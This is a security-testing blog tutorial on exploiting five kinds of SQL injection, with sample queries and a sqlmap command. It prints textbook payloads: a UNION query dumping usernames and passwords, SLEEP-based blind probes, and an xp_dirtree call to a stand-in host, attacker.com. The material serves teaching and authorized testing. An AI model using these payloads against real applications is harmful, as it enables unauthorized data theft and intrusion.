---
title: "Exploiting SQL Injection Vulnerabilities"
seoTitle: "SQL Injection Exploits Explained"
seoDescription: "Guide to exploiting SQL injection vulnerabilities: techniques, examples, and automated tools for web application security testing"
datePublished: Fri Jun 28 2024 04:16:50 GMT+0000 (Coordinated Universal Time)
cuid: clxy6luun000f09ky9zp5ao51
slug: exploiting-sql-injection-vulnerabilities
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1719509239858/dadd4a58-d48a-46fe-b78b-c62ba75601af.jpeg
tags: sql-injection, application-security, cybersecurity-1, ethicalhacking

---

**Introduction**

In the past sections, we discussed the different types of SQL injection vulnerabilities and how to test an application to see if it's vulnerable to SQL injection.

If you missed it, you can [`check it out here`](https://dhananjaykulkarni.hashnode.dev/steps-to-detect-sql-injection-vulnerabilities)

In this section, we'll dive into how to exploit SQL injection vulnerabilities to achieve your end goal. This will vary depending on the type of SQL injection vulnerability you're dealing with. We'll cover five different types: error-based SQL injection, union-based SQL injection, Boolean-based blind SQL injection, time-based blind SQL injection, and out-of-band SQL injection.

### 1\. Error-Based SQL Injection

**Concept:** Error-based SQL injection is an in-band SQL injection technique that forces the database to generate an error, giving the attacker information upon which to refine a query.

**Exploitation Steps:**

1. **Submit SQL Specific Characters:**
    
    * Input characters like single quote (`'`), double quote (`"`), or a comment delimiter (`--`).
        
2. **Observe the Application’s Response:**
    
    * Look for error messages that reveal database information.
        

**Example:**

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'password';
```

**Expected Result:** The application throws an error message similar to:

```plaintext
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''--' AND password = 'password'' at line 1
```

This indicates the application is vulnerable to SQL injection.

### 2\. Union-Based SQL Injection

**Concept:** Union-based SQL injection leverages the UNION SQL operator to combine the results of two queries into a single result set. To use the UNION operator, two rules must be followed:

* The number and order of the columns must be the same in both queries.
    
* The data types must be compatible.
    

**Exploitation Steps:**

1. **Determine Number of Columns:**
    
    * Use `ORDER BY` clause or inject null values.
        
2. **Find Useful Data Types:**
    
    * Probe columns to see if they can hold string data.
        

**Example:**

```sql
SELECT title, cost FROM products WHERE id = 1 UNION SELECT null, null -- ;
```

**Expected Result:**

```plaintext
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

By incrementing the number of null values, you determine the number of columns.

3. **Exploit the Vulnerability:**
    

```sql
SELECT title, cost FROM products WHERE id = 1 UNION SELECT username, password FROM users -- ;
```

**Expected Result:** The result set combines product titles and costs with usernames and passwords from the users table.

### 3\. Boolean-Based Blind SQL Injection

**Concept:** Boolean-based blind SQL injection relies on sending Boolean conditions to the server and observing differences in responses to infer data.

**Exploitation Steps:**

1. **Submit Boolean Conditions:**
    
    * Send a condition that evaluates to false and observe the response.
        
    * Send a condition that evaluates to true and observe the response.
        

**Example:**

```sql
SELECT * FROM users WHERE username = 'admin' AND '1'='1'; -- True condition
SELECT * FROM users WHERE username = 'admin' AND '1'='2'; -- False condition
```

**Expected Result:**

* The first query returns the expected page.
    
* The second query returns a different page or an error.
    

### 4\. Time-Based Blind SQL Injection

**Concept:** Time-based blind SQL injection uses time delays in SQL queries to infer data from the database.

**Exploitation Steps:**

1. **Submit Time-Delay Payloads:**
    
    * Inject a payload that causes a delay if the condition is true.
        

**Example:**

```sql
SELECT * FROM users WHERE username = 'admin' AND IF(1=1, SLEEP(5), 0);
```

**Expected Result:** The application delays the response by 5 seconds, indicating the condition is true.

### 5\. Out-of-Band SQL Injection

**Concept:** Out-of-band SQL injection relies on triggering a network connection to a system that you control.

**Exploitation Steps:**

1. **Submit Out-of-Band Payloads:**
    
    * Inject payloads designed to trigger a network interaction.
        

**Example:**

```sql
SELECT * FROM users WHERE username = 'admin'; exec xp_dirtree '\\attacker.com\share';
```

**Expected Result:** The server attempts to access [`attacker.com`](http://attacker.com), indicating a successful out-of-band interaction.

### Automated Exploitation Tools

**SQLMap:**

![sqlmap: automatic SQL injection and database takeover tool](https://sqlmap.org/images/screenshot.png align="left")

SQLMap is a powerful, open-source tool used to automate the process of detecting and exploiting SQL injection vulnerabilities. It can identify the type of SQL injection and exploit it to extract data, gain a shell, and more. To read more click [`here`](https://sqlmap.org/)

**Usage Example:**

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs
```

**Expected Result:** SQLMap identifies the database type and lists all available databases.

**Web Application Vulnerability Scanners:**

These tools scan web applications for various vulnerabilities, including SQL injection. They automate the discovery process but often require manual verification and exploitation. Read more [`here`](https://owasp.org/www-community/Vulnerability_Scanning_Tools)

### Conclusion

Understanding and exploiting SQL injection vulnerabilities require a methodical approach and familiarity with SQL concepts. By following the steps outlined for each type of SQL injection, you can effectively identify and exploit these vulnerabilities to test the security of web applications. Tools like SQLMap and web application vulnerability scanners can aid in this process, but manual testing and validation remain crucial for comprehensive security assessments.